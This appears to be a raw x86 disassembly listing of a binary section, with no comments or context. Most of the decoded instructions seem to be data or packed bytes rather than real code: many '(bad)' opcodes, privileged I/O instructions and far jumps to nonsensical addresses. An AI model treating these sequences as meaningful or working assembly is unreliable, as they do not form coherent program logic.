  41e55b:	shl    DWORD PTR [edx-0x1da138d3],0xe7
  41e562:	imul   ebx,eax,0x53
  41e565:	sahf   
  41e566:	push   esi
  41e567:	js     0x41e54e
  41e569:	jnp    0x41e585
  41e56b:	jmp    0x0:0xc587
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e5c3
  41e5e3:	adc    eax,0x46674d6f
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	mov    esi,cs
  41e5f0:	jg     0x41e63b
  41e5f2:	ret    
  41e5f3:	test   BYTE PTR [ebp-0x65],ah
  41e5f6:	out    dx,eax
  41e5f7:	fcomip st,st(7)
  41e5f9:	mov    edi,0x9e7cb054
  41e5fe:	xchg   edi,eax
  41e5ff:	xor    dl,bh
  41e601:	pop    ecx
  41e602:	pusha  
  41e603:	push   0x329f4384
  41e608:	or     edx,DWORD PTR [edx-0x4e4e3d63]
  41e60e:	rcl    DWORD PTR [eax+ebx*2-0x2bd64451],0x3e
  41e616:	pop    edx
  41e617:	retf   0x9638
  41e61a:	jbe    0x41e698
  41e61c:	push   ebx
  41e61d:	out    dx,al
  41e61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e620:	pop    esp
  41e621:	sub    BYTE PTR [edi-0x5],cl
  41e624:	inc    ebp
  41e625:	mov    DWORD PTR [esi+ebx*1-0x7de8959a],ebx
  41e62c:	ret    
  41e62d:	dec    eax
  41e62e:	and    edi,DWORD PTR [ebx]
  41e630:	or     BYTE PTR [esi],al
  41e632:	xor    eax,0x3a4f3cc4
  41e637:	cld    
  41e638:	xor    al,0xee
  41e63a:	lock ret 
  41e63c:	or     esp,esi
  41e63e:	inc    ecx
  41e63f:	out    0x1d,al
  41e641:	hlt    
  41e642:	outs   dx,DWORD PTR ds:[esi]
  41e643:	xor    ch,bl
  41e645:	inc    ebp
  41e646:	out    dx,al
  41e647:	and    bh,BYTE PTR [ebx-0x2f]
  41e64a:	xchg   esi,ecx
  41e64c:	lods   eax,DWORD PTR ds:[esi]
  41e64d:	fs inc ebx
  41e64f:	cmp    BYTE PTR [esi-0x3f],bl
  41e652:	sbb    al,0x91
  41e654:	or     al,0xe9
  41e656:	imul   edx,DWORD PTR [edi],0x35819093
  41e65c:	fs loopne 0x41e684
  41e65f:	mov    ds:0xd03967b,eax
  41e664:	jb     0x41e6d7
  41e666:	std    
  41e667:	pop    es
  41e668:	push   ebx
  41e669:	out    0x10,eax
  41e66b:	(bad)  
  41e66c:	cdq    
  41e66d:	mov    ds:0x3c1bc24d,eax
  41e672:	imul   eax,DWORD PTR [ebp-0x5798cd0b],0xffffffd5
  41e679:	sbb    BYTE PTR [ebx+0x48f34da5],ch
  41e67f:	faddp  st(6),st
  41e681:	jo     0x41e62f
  41e683:	or     edx,DWORD PTR [ecx+0x1e]
  41e686:	daa    
  41e687:	adc    eax,0x36337834
  41e68c:	jne    0x41e672
  41e68e:	cvtps2pd xmm2,QWORD PTR [esp+esi*1+0x2fdb3b71]
  41e696:	sub    BYTE PTR [edi+0x2c],0x15
  41e69a:	pop    ds
  41e69b:	and    BYTE PTR [edx-0x630a2304],al
  41e6a1:	cwde   
  41e6a2:	es or  edx,ebp
  41e6a5:	(bad)  
  41e6a6:	shr    DWORD PTR [eax+0x19],1
  41e6a9:	cli    
  41e6aa:	data16 lahf 
  41e6ac:	pop    ebp
  41e6ad:	add    dl,dh
  41e6af:	scas   eax,DWORD PTR es:[edi]
  41e6b0:	xor    bl,ah
  41e6b2:	icebp  
  41e6b3:	and    al,0x71
  41e6b5:	inc    ecx
  41e6b6:	in     eax,dx
  41e6b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6b8:	sbb    edi,DWORD PTR cs:[ebp-0x8]
  41e6bc:	mov    edx,0x7bfa6543
  41e6c1:	push   0xffffffcb
  41e6c3:	das    
  41e6c4:	mov    edx,0x2687b66f
  41e6c9:	loope  0x41e669
  41e6cb:	jmp    0xb8d2abb0
  41e6d0:	push   es
  41e6d1:	push   ecx
  41e6d2:	nop
  41e6d3:	xlat   BYTE PTR ds:[ebx]
  41e6d4:	or     BYTE PTR ss:[ebx-0x2b],al
  41e6d8:	adc    eax,0x90105fbb
  41e6dd:	xor    bh,BYTE PTR [edi+0x9]
  41e6e0:	mov    ecx,0x568a0f4
  41e6e5:	test   al,0x48
  41e6e7:	jl     0x41e66f
  41e6e9:	sub    dh,cl
  41e6eb:	adc    bl,al
  41e6ed:	loop   0x41e6ef
	...
  41e753:	add    BYTE PTR [eax],al
  41e755:	add    ch,al
  41e757:	cwde   
  41e758:	loope  0x41e7af
  41e75a:	std    
  41e75b:	jge    0x41e752
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ecx,DWORD PTR [edi-0x68]
  41e764:	cmp    dh,BYTE PTR [ebp+0x67]
  41e767:	inc    edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	(bad)  
  41e770:	es or  ah,dh
  41e773:	jecxz  0x41e774
  41e775:	js     0x41e75d
  41e777:	sub    cl,cl
  41e779:	adc    bh,BYTE PTR [ebp+ebx*8+0x29]
  41e77d:	hlt    
  41e77e:	inc    esi
  41e77f:	jmp    0x1b5b:0x111d2662
  41e786:	lea    esi,[eax+0x76]
  41e789:	push   edi
  41e78a:	ds mov bl,0x5e
  41e78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e78e:	fwait
  41e78f:	aam    0x5a
  41e791:	stc    
  41e792:	dec    cx
  41e794:	sar    BYTE PTR [eax+edi*2-0x6d],0xf6
  41e799:	stc    
  41e79a:	inc    al
  41e79c:	movsx  edx,WORD PTR [ebx]
  41e79f:	xchg   BYTE PTR [ecx-0x52e2c879],dl
  41e7a5:	daa    
  41e7a6:	mov    al,ds:0xf27993be
  41e7ab:	cld    
  41e7ac:	inc    eax
  41e7ad:	fist   DWORD PTR [eax+0x3]
  41e7b0:	repz pop ecx
  41e7b2:	and    eax,0x491e0104
  41e7b7:	dec    esp
  41e7b8:	jae    0x41e831
  41e7ba:	aas    
  41e7bb:	cmp    BYTE PTR [esi+ecx*4+0x1041a157],ah
  41e7c2:	cmp    DWORD PTR [ecx],eax
  41e7c4:	(bad)  
  41e7c5:	jb     0x41e835
  41e7c7:	pop    edx
  41e7c8:	jg     0x41e7e4
  41e7ca:	in     eax,dx
  41e7cb:	ret    
  41e7cc:	xchg   esi,eax
  41e7cd:	std    
  41e7ce:	aad    0x1a
  41e7d0:	es sbb al,0x66
  41e7d3:	scas   eax,DWORD PTR es:[edi]
  41e7d4:	and    BYTE PTR [edi-0x23],ch
  41e7d7:	jmp    0x5de6:0x9dfb000b
  41e7de:	sub    eax,0x32eba30c
  41e7e3:	cs cld 
  41e7e5:	or     BYTE PTR [ebx+0x72],dh
  41e7e8:	mov    WORD PTR [ecx-0x6d15d348],ds
  41e7ee:	xlat   BYTE PTR ds:[ebx]
  41e7ef:	mov    ebx,0xffc794bb
  41e7f4:	pusha  
  41e7f5:	rcr    DWORD PTR [ebp-0x6e],cl
  41e7f8:	fmul   DWORD PTR [ebx]
  41e7fa:	mov    eax,0x96fc59a1
  41e7ff:	cwde   
  41e800:	mov    edi,0xef536414
  41e805:	aaa    
  41e806:	push   edi
  41e807:	sbb    BYTE PTR [eax+edi*2-0x1b522e55],bl
  41e80e:	(bad)  
  41e810:	out    0x5d,eax
  41e812:	loop   0x41e80a
  41e814:	inc    ebp
  41e815:	imul   edi,ebx,0xffffffe4
  41e818:	xor    dh,BYTE PTR [ebp+0x64]
  41e81b:	push   ds
  41e81c:	and    esi,DWORD PTR [edi-0x3d091ee7]
  41e822:	adc    ebp,0x71919a4a
  41e828:	fiadd  WORD PTR [ecx-0x78]
  41e82b:	mov    edi,0x42bce864
  41e830:	jnp    0x41e8a0
  41e832:	push   ebp
  41e833:	out    dx,eax
  41e834:	lahf   
  41e835:	pop    esi
  41e836:	aas    
  41e837:	or     ch,bh
  41e839:	jo     0x41e811
  41e83b:	add    dl,dh
  41e83d:	sub    DWORD PTR [ecx],edx
  41e83f:	lods   eax,DWORD PTR ds:[esi]
  41e840:	jl     0x41e85c
  41e842:	pushf  
  41e843:	aad    0xad
  41e845:	jnp    0x41e8c2
  41e847:	xchg   ebp,eax
  41e848:	lds    eax,FWORD PTR [ebx+0x2765db8a]
  41e84e:	xor    esi,DWORD PTR [ebx-0x663119bc]
  41e854:	call   0x6368:0x48347ee7
  41e85b:	fistp  DWORD PTR [edi+esi*4-0x536e8dee]
  41e862:	dec    ecx
  41e863:	push   ecx
  41e864:	dec    esi
  41e865:	ret    
  41e866:	outs   dx,BYTE PTR ds:[esi]
  41e867:	sub    ecx,DWORD PTR [edx]
  41e869:	stos   DWORD PTR es:[edi],eax
  41e86a:	mov    WORD PTR [edx],ss
  41e86c:	dec    esi
  41e86d:	mov    DWORD PTR [eax],0x0
	...
  41e8d3:	add    BYTE PTR [eax],al
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e905
  41e8e3:	ret    0xccdd
  41e8e6:	addr16 dec eax
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	aaa    
  41e8ef:	add    DWORD PTR [esi-0x61],0xdd36a73d
  41e8f6:	inc    esi
  41e8f7:	push   ss
  41e8f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8f9:	ret    0xb101
  41e8fc:	pushf  
  41e8fd:	xchg   edx,eax
  41e8fe:	pushf  
  41e8ff:	popf   
  41e900:	or     bl,BYTE PTR [ebp+esi*8+0x4c]
  41e904:	jb     0x41e916
  41e906:	arpl   WORD PTR [esi-0x63],sp
  41e909:	mov    dh,0x4f
  41e90b:	cmp    DWORD PTR [ebx],0xffffffcb
  41e90e:	out    0xf8,eax
  41e910:	adc    al,0x46
  41e912:	test   eax,0x127be5e4
  41e917:	call   0x54bb52e0
  41e91c:	rcl    DWORD PTR [edx-0x3d],cl
  41e91f:	iret   
  41e920:	das    
  41e921:	lods   al,BYTE PTR ds:[esi]
  41e922:	sbb    cl,BYTE PTR [esi+ebx*8-0x1aa6ffa1]
  41e929:	mov    esi,0x48bb0b47
  41e92e:	loop   0x41e8e7
  41e930:	imul   ecx,DWORD PTR [ebx-0x6bee95a4],0x65dc82c8
  41e93a:	sbb    al,0x3
  41e93c:	(bad)  
  41e93d:	cwde   
  41e93e:	shl    DWORD PTR [ebx],cl
  41e940:	mov    ecx,0x7344a2ec
  41e945:	sub    ecx,esi
  41e947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e948:	fidiv  WORD PTR [esi]
  41e94a:	popa   
  41e94b:	push   ds
  41e94c:	fdiv   DWORD PTR [esi+0x1b9b520b]
  41e952:	(bad)  
  41e954:	jmp    0x8c73cd77
  41e959:	xor    al,0x3
  41e95b:	xor    al,0x6a
  41e95d:	mov    ch,0x69
  41e95f:	xor    BYTE PTR cs:[eax-0x2f],dh
  41e963:	mov    edi,0x1647e16b
  41e968:	leave  
  41e969:	xor    al,0x2
  41e96b:	cdq    
  41e96c:	adc    ebx,DWORD PTR [ebx]
  41e96e:	repnz leave 
  41e970:	push   edi
  41e971:	mov    BYTE PTR [edi],dh
  41e973:	mov    dh,0xd6
  41e975:	pop    esp
  41e976:	mov    dl,0xcc
  41e978:	dec    esi
  41e979:	xchg   BYTE PTR ds:0x2f6790c9,ch
  41e97f:	inc    ebx
  41e980:	jae    0x41e913
  41e982:	xor    al,0x5c
  41e984:	add    al,0xec
  41e986:	js     0x41ea01
  41e988:	outs   dx,DWORD PTR ds:[esi]
  41e989:	push   esi
  41e98a:	inc    esp
  41e98b:	and    al,0x1d
  41e98d:	fisub  WORD PTR [esi+esi*4]
  41e990:	nop
  41e991:	or     ebp,edi
  41e993:	xchg   BYTE PTR [ecx-0x138d1af4],bh
  41e999:	jb     0x41e946
  41e99b:	dec    edx
  41e99c:	icebp  
  41e99d:	or     DWORD PTR [esi],ecx
  41e99f:	xchg   esp,eax
  41e9a0:	imul   ebx,DWORD PTR [ecx-0x6421c7a1],0xffffffe3
  41e9a7:	fdivr  DWORD PTR [eax+0x217ccff]
  41e9ad:	imul   edi,DWORD PTR [edi-0x4602cdff],0x6
  41e9b4:	in     eax,0xf1
  41e9b6:	pop    ebp
  41e9b7:	add    edi,DWORD PTR [ebx+0x73a0f988]
  41e9bd:	and    DWORD PTR [esi-0x1c],ecx
  41e9c0:	sub    DWORD PTR ds:0x27cbc1b9,esp
  41e9c6:	jp     0x41ea0f
  41e9c8:	xor    edi,ebp
  41e9ca:	arpl   WORD PTR [edi+0x8],di
  41e9cd:	jmp    0x41e9cc
  41e9cf:	dec    ebp
  41e9d0:	jle    0x41e960
  41e9d2:	inc    eax
  41e9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d4:	in     eax,dx
  41e9d5:	les    ebp,FWORD PTR [edi+edx*1-0x5d]
  41e9d9:	dec    esi
  41e9db:	push   DWORD PTR [ebp-0x7e]
  41e9de:	or     ah,BYTE PTR [ecx-0x78eb828e]
  41e9e4:	pop    edx
  41e9e5:	mov    esi,0xa7085cc9
  41e9ea:	test   BYTE PTR [ecx-0x53],0x39
	...
  41ea56:	js     0x41ea55
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	add    esi,DWORD PTR [edi]
  41ea64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea65:	cld    
  41ea66:	addr16 dec ecx
  41ea68:	add    DWORD PTR [eax],eax
  41ea6a:	add    BYTE PTR [ecx],al
  41ea6c:	add    BYTE PTR [eax],al
  41ea6e:	(bad)  
  41ea6f:	mov    edi,0x71dea1a2
  41ea74:	in     al,dx
  41ea75:	push   ecx
  41ea76:	test   DWORD PTR [edi-0x3],ebx
  41ea79:	fsubr  QWORD PTR [eax-0x10]
  41ea7c:	loopne 0x41ea4f
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	mov    BYTE PTR [eax-0x79],bl
  41ea82:	add    DWORD PTR [ecx],edi
  41ea84:	repz scas al,BYTE PTR es:[edi]
  41ea86:	iret   
  41ea87:	repnz es xchg ebp,eax
  41ea8a:	leave  
  41ea8b:	pop    eax
  41ea8c:	xor    BYTE PTR [ebp+0x42],bh
  41ea8f:	ror    eax,cl
  41ea91:	jmp    0xbb3836f6
  41ea96:	aam    0x85
  41ea98:	mov    ds,WORD PTR [eax+edi*4-0x70]
  41ea9c:	in     al,dx
  41ea9d:	ins    DWORD PTR es:[edi],dx
  41ea9e:	xchg   esp,eax
  41ea9f:	aas    
  41eaa0:	cmp    eax,0x7b2064b6
  41eaa5:	add    al,0x8c
  41eaa7:	lahf   
  41eaa8:	js     0x41ea61
  41eaaa:	dec    edi
  41eaab:	stc    
  41eaac:	push   0x15
  41eaae:	(bad)  
  41eaaf:	ja     0x41eb1f
  41eab1:	jne    0x41ea62
  41eab3:	outs   dx,DWORD PTR ds:[esi]
  41eab4:	rcr    BYTE PTR [esi],1
  41eab6:	jg     0x41ea57
  41eab8:	fdiv   QWORD PTR [ebp-0x19dd87d3]
  41eabe:	jmp    0x2107:0xa4da281a
  41eac5:	adc    dh,BYTE PTR [ebp-0x3b77a710]
  41eacb:	retf   0x602f
  41eace:	mov    ds:0xa4aec231,eax
  41ead3:	adc    al,0x26
  41ead5:	loop   0x41ead9
  41ead7:	stos   DWORD PTR es:[edi],eax
  41ead8:	pop    ds
  41ead9:	(bad)  
  41eada:	jmp    0x41ea6d
  41eadc:	pushf  
  41eadd:	loop   0x41eb21
  41eadf:	retf   0x2e62
  41eae2:	jb     0x41eaf6
  41eae4:	inc    eax
  41eae5:	loop   0x41ea9c
  41eae7:	dec    ax
  41eae9:	jl     0x41eb5d
  41eaeb:	and    al,0x62
  41eaed:	mov    bl,0x87
  41eaef:	push   edi
  41eaf0:	ins    BYTE PTR es:[edi],dx
  41eaf1:	push   esp
  41eaf2:	popa   
  41eaf3:	aad    0x2c
  41eaf5:	in     eax,0x75
  41eaf7:	mov    bl,0x19
  41eaf9:	sub    eax,0x5d87ba6c
  41eafe:	sbb    BYTE PTR [edx+eiz*2-0x58],0x26
  41eb03:	inc    edx
  41eb04:	mov    edi,0xa6291408
  41eb09:	loopne 0x41eacf
  41eb0b:	mov    al,ds:0x16033561
  41eb10:	mov    dl,dh
  41eb12:	call   0x9fe6:0xdf43c87d
  41eb19:	cmp    eax,0xddd40332
  41eb1e:	jo     0x41eb53
  41eb20:	mov    bl,ch
  41eb22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb23:	fmul   st(3),st
  41eb25:	xor    bh,BYTE PTR [edi+0x718c59c]
  41eb2b:	in     eax,dx
  41eb2c:	push   ds
  41eb2d:	fs pop esp
  41eb2f:	loopne 0x41eb03
  41eb31:	fdiv   st(6),st
  41eb33:	cmp    BYTE PTR [ecx],ah
  41eb35:	sahf   
  41eb36:	add    BYTE PTR [esi-0x3d781e58],dh
  41eb3c:	sbb    al,0x6a
  41eb3e:	aad    0xce
  41eb40:	xchg   esp,eax
  41eb41:	retf   
  41eb42:	adc    eax,0xebb01ca2
  41eb47:	leave  
  41eb48:	std    
  41eb49:	inc    esp
  41eb4b:	in     al,dx
  41eb4c:	sbb    eax,0x6d7cc928
  41eb51:	adc    ebx,DWORD PTR ds:0x2cba2f06
  41eb57:	data16 cld 
  41eb59:	jle    0x41eb50
  41eb5b:	out    0xcf,eax
  41eb5d:	enter  0xb520,0x29
  41eb61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb62:	push   ecx
  41eb63:	leave  
  41eb64:	shl    eax,1
  41eb66:	jns    0x41eb9a
  41eb68:	push   edx
  41eb69:	or     eax,0x8ebc3935
	...
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x58
  41ebe3:	call   0x1:0x4a67e421
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	lds    esi,FWORD PTR [esi]
  41ebf0:	sub    bh,0x84
  41ebf3:	fisttp DWORD PTR [ecx-0x3e]
  41ebf6:	lds    esi,FWORD PTR [edi+0x7bb91b6b]
  41ebfc:	xlat   BYTE PTR ds:[ebx]
  41ebfd:	data16 gs daa 
  41ec00:	jno    0x41eba4
  41ec02:	or     eax,0xc8cba21a
  41ec07:	call   0xe580:0x20bcd20c
  41ec0e:	pop    ebx
  41ec0f:	and    DWORD PTR [ebx],0xffffffd5
  41ec12:	(bad)  
  41ec13:	sbb    eax,0xeb63b3c9
  41ec18:	daa    
  41ec19:	push   eax
  41ec1a:	xor    al,0x2b
  41ec1c:	ins    DWORD PTR es:[edi],dx
  41ec1d:	adc    dl,BYTE PTR [esp+edx*2]
  41ec20:	mov    esi,0xcb3413a5
  41ec25:	jecxz  0x41ec55
  41ec27:	push   0x7d119302
  41ec2c:	sbb    DWORD PTR ds:0x3aab2e58,esi
  41ec32:	xor    al,0x27
  41ec34:	push   esp
  41ec35:	fs jle 0x41ec8b
  41ec38:	mov    edi,0x2227a1eb
  41ec3d:	dec    ecx
  41ec3e:	test   eax,eax
  41ec40:	cdq    
  41ec41:	out    dx,eax
  41ec42:	test   DWORD PTR [ebx-0x2151ab31],eax
  41ec48:	mov    ebx,0xc147e48f
  41ec4d:	mov    esp,ebp
  41ec4f:	push   esp
  41ec50:	int    0xfb
  41ec52:	pop    ebx
  41ec53:	pop    esp
  41ec54:	mov    cl,0x9
  41ec56:	xlat   BYTE PTR ds:[ebx]
  41ec57:	and    eax,0xe9484b7d
  41ec5c:	repz xchg dx,ax
  41ec5f:	push   0xffffffe9
  41ec61:	mov    dl,0xbb
  41ec63:	mov    bl,0xc4
  41ec65:	mov    cl,0x2a
  41ec67:	sub    al,bh
  41ec69:	lds    ecx,FWORD PTR [esi-0x1b0f7ed]
  41ec6f:	push   ss
  41ec70:	out    dx,eax
  41ec71:	push   eax
  41ec72:	ja     0x41ec92
  41ec74:	pushf  
  41ec75:	sub    eax,0x51be77c6
  41ec7a:	loop   0x41ecb4
  41ec7c:	sub    eax,0xb08e3310
  41ec81:	jp     0x41ec6e
  41ec83:	(bad)  [ecx+0x42]
  41ec86:	popa   
  41ec87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec88:	in     eax,0x73
  41ec8a:	iret   
  41ec8b:	mov    ebx,eax
  41ec8d:	adc    al,0xb4
  41ec8f:	ret    
  41ec90:	jecxz  0x41ec6b
  41ec92:	pop    esp
  41ec93:	sub    eax,0x969c19e4
  41ec98:	fisubr DWORD PTR [esi+0x35]
  41ec9b:	ret    
  41ec9c:	cmp    DWORD PTR [ebx],edi
  41ec9e:	jmp    0x41ec98
  41eca0:	aad    0xa3
  41eca2:	jmp    0x682e88ff
  41eca7:	repnz adc ch,ah
  41ecaa:	xchg   DWORD PTR [ebx+0x12],ebx
  41ecad:	inc    ebx
  41ecae:	mov    ebp,0xd75fe482
  41ecb3:	xchg   ebx,eax
  41ecb4:	stos   DWORD PTR es:[edi],eax
  41ecb5:	adc    ah,BYTE PTR ds:0xeabe7075
  41ecbb:	or     DWORD PTR [ebp-0x2e],esp
  41ecbe:	mov    ds:0xbd9b6d9d,eax
  41ecc3:	outs   dx,BYTE PTR ds:[esi]
  41ecc4:	stc    
  41ecc5:	xchg   ecx,eax
  41ecc6:	aad    0x8e
  41ecc8:	mov    al,0xbc
  41ecca:	mov    bl,BYTE PTR [eax-0x24605d70]
  41ecd0:	or     BYTE PTR [ebx+0x13],0xb6
  41ecd4:	xor    DWORD PTR [ecx+0xd4b87d8],esp
  41ecda:	in     eax,0xc2
  41ecdc:	sbb    al,0xd0
  41ecde:	(bad)  
  41ecdf:	test   al,0x73
  41ece1:	adc    esp,DWORD PTR [ecx+edx*4]
  41ece4:	jmp    0x9395:0x5748a159
  41eceb:	push   0x6b5b
	...
  41ed54:	add    BYTE PTR [eax],al
  41ed56:	inc    ecx
  41ed57:	icebp  
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xbb6f5fd0
  41ed64:	pushf  
  41ed65:	pusha  
  41ed66:	addr16 dec ebx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	loop   0x41ed3d
  41ed70:	js     0x41ed45
  41ed72:	(bad)  
  41ed73:	js     0x41ed48
  41ed75:	cwde   
  41ed76:	lea    edx,[edi+0x36ea7fc5]
  41ed7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed7d:	cmp    al,0x98
  41ed7f:	arpl   WORD PTR [esi],cx
  41ed81:	aam    0x4d
  41ed83:	mov    ebp,0xb79d83bb
  41ed88:	xor    esi,ecx
  41ed8a:	dec    eax
  41ed8b:	push   esp
  41ed8c:	inc    ecx
  41ed8d:	mov    ds:0x58ab2a7d,al
  41ed92:	(bad)  
  41ed93:	leave  
  41ed94:	jmp    0xb6227e4a
  41ed99:	adc    edi,0x363dd2a6
  41ed9f:	mov    edx,?
  41eda1:	xlat   BYTE PTR ds:[ebx]
  41eda2:	(bad)  
  41eda3:	mov    ebp,ecx
  41eda5:	scas   al,BYTE PTR es:[edi]
  41eda6:	enter  0x463d,0x8f
  41edaa:	push   cs
  41edab:	int3   
  41edac:	dec    edi
  41edad:	ss cmp eax,0x7e9add54
  41edb3:	popf   
  41edb4:	push   eax
  41edb5:	sahf   
  41edb6:	add    edi,DWORD PTR [eax+0x2f]
  41edb9:	out    0x97,eax
  41edbb:	xchg   esi,eax
  41edbc:	jmp    0xafe42af0
  41edc1:	icebp  
  41edc2:	stc    
  41edc3:	stc    
  41edc4:	inc    ebx
  41edc5:	ficom  DWORD PTR [esi+0x6c]
  41edc8:	mov    WORD PTR [esi],fs
  41edca:	mov    ebp,0xea6dc52e
  41edcf:	mov    ah,0x8c
  41edd1:	push   esp
  41edd2:	shr    BYTE PTR [ebp-0x15],cl
  41edd5:	jg     0x41ed86
  41edd7:	push   0x9
  41edd9:	mov    BYTE PTR [edi],al
  41eddb:	push   ebx
  41eddc:	sbb    al,0x4c
  41edde:	lds    edi,FWORD PTR [esi+0x4d7ee83]
  41ede4:	popa   
  41ede5:	mov    dl,dh
  41ede7:	pop    ss
  41ede8:	jne    0x41ee63
  41edea:	jecxz  0x41ed86
  41edec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eded:	xlat   BYTE PTR ds:[ebx]
  41edee:	or     DWORD PTR [ebx-0x3134705e],eax
  41edf4:	pop    ebp
  41edf5:	cmp    eax,0xd5c6eb92
  41edfa:	and    DWORD PTR [edi],ebp
  41edfc:	in     al,0x99
  41edfe:	(bad)  
  41edff:	cli    
  41ee00:	jnp    0xed0b80c3
  41ee06:	(bad)  
  41ee07:	pop    esp
  41ee08:	fisubr WORD PTR ss:[edx]
  41ee0b:	lea    eax,[eax-0x3b]
  41ee0e:	lock mov bh,0x50
  41ee11:	sbb    esi,DWORD PTR [edi]
  41ee13:	mov    dl,0xa7
  41ee15:	inc    eax
  41ee16:	iret   
  41ee17:	jge    0x41ee05
  41ee19:	mov    ebp,0xb7104f83
  41ee1e:	mov    al,0xac
  41ee20:	sbb    DWORD PTR [edx+0x24824ddc],ebp
  41ee26:	into   
  41ee27:	in     al,dx
  41ee28:	sbb    bl,BYTE PTR [ecx+ebp*8]
  41ee2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee2c:	(bad)  
  41ee2d:	pop    ebx
  41ee2e:	add    eax,0xcd6cbadb
  41ee33:	sbb    eax,0xf7b989b1
  41ee38:	mov    ss,WORD PTR [esi-0x74]
  41ee3b:	add    ah,BYTE PTR ds:0x1317c9c8
  41ee41:	jmp    0x195d70a5
  41ee46:	std    
  41ee47:	xor    BYTE PTR [eax-0x4af7cb04],dh
  41ee4d:	adc    al,0x21
  41ee4f:	enter  0x40b,0x85
  41ee53:	sub    ebx,DWORD PTR [eax+0x57]
  41ee56:	cmp    DWORD PTR [edi-0x39],esi
  41ee59:	mov    ch,0x46
  41ee5b:	jmp    0xf94b33f
  41ee60:	pop    ds
  41ee61:	fidiv  DWORD PTR [edx-0x29]
  41ee64:	imul   eax,ecx,0x4b
  41ee67:	pop    edi
  41ee68:	push   ss
  41ee69:	and    al,bh
  41ee6b:	inc    esi
  41ee6c:	jmp    0x0:0x63
	...
  41eed3:	add    BYTE PTR [eax],al
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x67c2:0xca230ce7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	in     al,0xbf
  41eef0:	cdq    
  41eef1:	and    ch,dl
  41eef3:	push   eax
  41eef4:	push   esp
  41eef5:	inc    edx
  41eef6:	rcr    BYTE PTR [ebp+0x5ddcdf70],1
  41eefc:	cmp    bh,dl
  41eefe:	jo     0x41eed8
  41ef00:	mov    ah,0xe6
  41ef02:	idiv   BYTE PTR [edx+0x18d9cda5]
  41ef08:	gs ds mov edi,0x327695ea
  41ef0f:	or     BYTE PTR [edi-0x24],dh
  41ef12:	mov    eax,ds:0x89fa3f48
  41ef17:	int    0x55
  41ef19:	mov    esp,0x61b96b24
  41ef1e:	sbb    al,0xb7
  41ef20:	add    al,BYTE PTR [edi-0x10]
  41ef23:	cmp    BYTE PTR [eax],dl
  41ef25:	mov    DWORD PTR [ebx],eax
  41ef27:	add    ecx,DWORD PTR gs:[eax+esi*1-0x4b]
  41ef2c:	sbb    edi,DWORD PTR [edi-0x1a8310cc]
  41ef32:	and    al,0xc7
  41ef34:	mov    ecx,0x9f6763be
  41ef39:	dec    edx
  41ef3a:	push   edi
  41ef3b:	popf   
  41ef3c:	xor    BYTE PTR ds:0xaed1ad60,cl
  41ef42:	or     BYTE PTR [edi-0x5],bl
  41ef45:	add    al,0x6f
  41ef47:	dec    esi
  41ef48:	sub    bh,BYTE PTR [eax+0x428d50ad]
  41ef4e:	fist   DWORD PTR [edx+esi*2]
  41ef51:	mov    eax,0x4a481aa2
  41ef56:	test   BYTE PTR [eax+0x1a1390e6],al
  41ef5c:	enter  0xb23c,0x53
  41ef60:	les    ecx,FWORD PTR [ecx]
  41ef62:	sub    eax,0x2d5cde5
  41ef67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef68:	imul   esp,DWORD PTR [edi],0x4f9c073b
  41ef6e:	or     al,0x71
  41ef70:	or     eax,0xa07aba34
  41ef75:	push   0x66
  41ef77:	add    eax,0x4836c1b9
  41ef7c:	jbe    0x41effd
  41ef7e:	mov    al,0x6
